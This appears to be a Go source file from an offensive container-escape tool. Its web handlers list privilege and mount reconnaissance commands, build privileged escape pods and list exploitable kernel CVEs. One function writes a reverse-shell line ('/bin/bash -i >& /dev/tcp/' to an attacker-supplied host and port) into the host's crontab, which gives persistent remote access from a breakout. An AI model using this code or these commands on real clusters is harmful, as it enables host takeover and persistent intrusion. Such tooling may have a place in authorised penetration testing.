package handler

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/gin-gonic/gin"
	"sigs.k8s.io/yaml"
)

type EscapeHandler struct{}

func NewEscapeHandler() *EscapeHandler { return &EscapeHandler{} }

func (h *EscapeHandler) GetEscapeChecks(c *gin.Context) {
	checks := []gin.H{
		{"check": "Privileged Container", "cmd": "cat /proc/1/status | grep -i 'seccomp\\|Seccomp'", "desc": "Check if container is privileged"},
		{"check": "Host PID Namespace", "cmd": "ls -la /proc/1/root/", "desc": "Check if host PID namespace is shared"},
		{"check": "Host Network", "cmd": "ip addr show; arp -a", "desc": "Check if host network is accessible"},
		{"check": "Docker Socket", "cmd": "ls -la /var/run/docker.sock", "desc": "Check if docker.sock is mounted"},
		{"check": "Cgroup RW", "cmd": "mount | grep cgroup; ls -la /sys/fs/cgroup/", "desc": "Check cgroup mount permissions"},
		{"check": "Procfs RW", "cmd": "ls -la /proc/", "desc": "Check procfs access"},
		{"check": "Host Mounts", "cmd": "mount | grep -E '(hostPath|/host|/mnt)'", "desc": "Check for host mount points"},
		{"check": "Capabilities", "cmd": "cat /proc/1/status | grep CapEff", "desc": "Check available capabilities"},
	}
	c.JSON(http.StatusOK, gin.H{"checks": checks})
}

func (h *EscapeHandler) PrivilegedEscape(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		PodName    string `json:"pod_name" binding:"required"`
		LHost      string `json:"lhost" binding:"required"`
		LPort      string `json:"lport" binding:"required"`
		Token      string `json:"token"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	pod := buildEscapePodObject(escapePodRequest{
		Namespace:  req.Namespace,
		EscapeMode: "privileged",
	})
	body, err := yaml.Marshal(pod)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "marshal escape pod yaml: " + err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"yaml":             string(body),
		"escape_mode":      "privileged",
		"namespace":        req.Namespace,
		"pod_name":         pod.Name,
		"commands":         extractCommandStrings((&CDKHandler{}).getExploitCommands("privileged")),
		"exploit_commands": (&CDKHandler{}).getExploitCommands("privileged"),
		"description":      getEscapeDescription("privileged"),
		"compat":           true,
	})
}

func (h *EscapeHandler) MountEscape(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host"`
		Namespace  string `json:"namespace"`
		EscapeType string `json:"escape_type" binding:"required"`
		LHost      string `json:"lhost" binding:"required"`
		LPort      string `json:"lport" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if strings.TrimSpace(req.Namespace) == "" {
		req.Namespace = "default"
	}

	mode, customCommand, ok := legacyEscapeTypeToCDKConfig(req.EscapeType, req.LHost, req.LPort)
	if !ok {
		c.JSON(http.StatusBadRequest, gin.H{"error": "unsupported escape type", "available": []string{"chroot", "crontab", "docker.sock", "procfs"}})
		return
	}
	pod := buildEscapePodObject(escapePodRequest{
		Namespace:  req.Namespace,
		EscapeMode: mode,
		Command:    customCommand,
	})
	body, err := yaml.Marshal(pod)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": "marshal escape pod yaml: " + err.Error()})
		return
	}
	handler := &CDKHandler{}
	c.JSON(http.StatusOK, gin.H{
		"yaml":             string(body),
		"escape_type":      req.EscapeType,
		"escape_mode":      mode,
		"namespace":        req.Namespace,
		"pod_name":         pod.Name,
		"commands":         extractCommandStrings(handler.getExploitCommands(mode)),
		"exploit_commands": handler.getExploitCommands(mode),
		"description":      getEscapeDescription(mode),
		"compat":           true,
	})
}

func legacyEscapeTypeToCDKConfig(escapeType, lhost, lport string) (string, string, bool) {
	switch strings.TrimSpace(escapeType) {
	case "chroot":
		return "privileged", "", true
	case "crontab":
		crontabLine := fmt.Sprintf("* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/%s/%s 0>&1\"", lhost, lport)
		command := fmt.Sprintf("echo %s >> /host/etc/crontab 2>/dev/null || echo 'write crontab failed'; sleep 3600", shellQuoteSingle(crontabLine))
		return "privileged", command, true
	case "docker.sock":
		return "docker-sock", "", true
	case "procfs":
		return "host-proc", "", true
	default:
		return "", "", false
	}
}

func extractCommandStrings(items []gin.H) []string {
	commands := make([]string, 0, len(items))
	for _, item := range items {
		if command, ok := item["cmd"].(string); ok {
			commands = append(commands, command)
		}
	}
	return commands
}

func (h *EscapeHandler) KernelVulnerabilities(c *gin.Context) {
	vulns := []gin.H{
		{"cve": "CVE-2016-5195", "name": "DirtyCow", "affected": "Kernel < 4.8.3", "exploit": "https://github.com/dirtycow/dirtycow.github.io"},
		{"cve": "CVE-2020-14386", "name": "CAP_NET_RAW overflow", "affected": "Kernel < 5.9", "exploit": "Requires CAP_NET_RAW"},
		{"cve": "CVE-2021-22555", "name": "Netfilter heap out-of-bounds", "affected": "Kernel 2.6.19 - 5.12", "exploit": ""},
		{"cve": "CVE-2021-3493", "name": "OverlayFS", "affected": "Ubuntu kernel", "exploit": ""},
		{"cve": "CVE-2022-0492", "name": "cgroup v1 release_agent", "affected": "Kernel with cgroup v1", "exploit": "Requires CAP_SYS_ADMIN"},
		{"cve": "CVE-2022-0847", "name": "DirtyPipe", "affected": "Kernel 5.8 - 5.16.11", "exploit": ""},
		{"cve": "CVE-2026-31431", "name": "copy-fail", "affected": "x86_64 only", "exploit": "non-root to root"},
	}
	c.JSON(http.StatusOK, gin.H{"vulnerabilities": vulns})
}
